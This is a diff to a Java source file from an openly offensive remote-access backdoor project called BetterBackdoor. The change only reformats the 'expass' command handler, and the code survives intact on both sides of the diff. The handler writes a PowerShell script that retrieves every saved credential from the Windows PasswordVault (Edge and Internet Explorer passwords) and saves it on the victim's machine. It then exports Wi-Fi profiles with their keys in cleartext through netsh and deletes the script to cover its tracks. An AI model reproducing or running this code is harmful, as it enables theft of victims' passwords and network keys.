@@ -9,11 +9,8 @@ import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Scanner;
-
 import javax.imageio.ImageIO;
-
 import org.apache.commons.io.FileUtils;
-
 import com.github.thatcherdev.betterbackdoor.backend.DuckyScripts;
 import com.github.thatcherdev.betterbackdoor.backend.FTP;
 import com.github.thatcherdev.betterbackdoor.backend.KeyLogger;
@@ -70,21 +67,19 @@ public class HandleCommand {
 		else if (command.equals("expass"))
 			try {
 				File exfilBrowserCreds = new File("ExfilBrowserCreds.ps1");
-				try(PrintWriter out = new PrintWriter(exfilBrowserCreds)){
-				
-				out.println("$filename=$PSScriptRoot+\"\\gathered\\BrowserPasswords.txt\"\n"
-						+ "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n"
-						+ "$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n"
-						+ "foreach ($c in $creds) {$c.RetrievePassword()}\n"
-						+ "$creds | Format-List -Property Resource,UserName,Password | Out-File $filename\n"
-						+ "echo \"Microsoft Edge and Internet Explorer passwords exfiltrated to '$filename' on vitim's computer\"\n"
-						+ "exit");
-				out.flush();
-			
-				send += Utils.runPSScript(exfilBrowserCreds.getAbsolutePath()) + "\n";
-				send += Utils.runCommand(
-						"netsh wlan export profile key=clear folder=" + System.getProperty("user.dir") + "\\gathered");
-				FileUtils.forceDelete(exfilBrowserCreds);
+				try (PrintWriter out = new PrintWriter(exfilBrowserCreds)) {
+					out.println("$filename=$PSScriptRoot+\"\\gathered\\BrowserPasswords.txt\"\n"
+							+ "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n"
+							+ "$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n"
+							+ "foreach ($c in $creds) {$c.RetrievePassword()}\n"
+							+ "$creds | Format-List -Property Resource,UserName,Password | Out-File $filename\n"
+							+ "echo \"Microsoft Edge and Internet Explorer passwords exfiltrated to '$filename' on vitim's computer\"\n"
+							+ "exit");
+					out.flush();
+					send += Utils.runPSScript(exfilBrowserCreds.getAbsolutePath()) + "\n";
+					send += Utils.runCommand("netsh wlan export profile key=clear folder="
+							+ System.getProperty("user.dir") + "\\gathered");
+					FileUtils.forceDelete(exfilBrowserCreds);
 				}
 			} catch (Exception e) {
 				send = "An error occurred when trying to exfiltrate passwords";
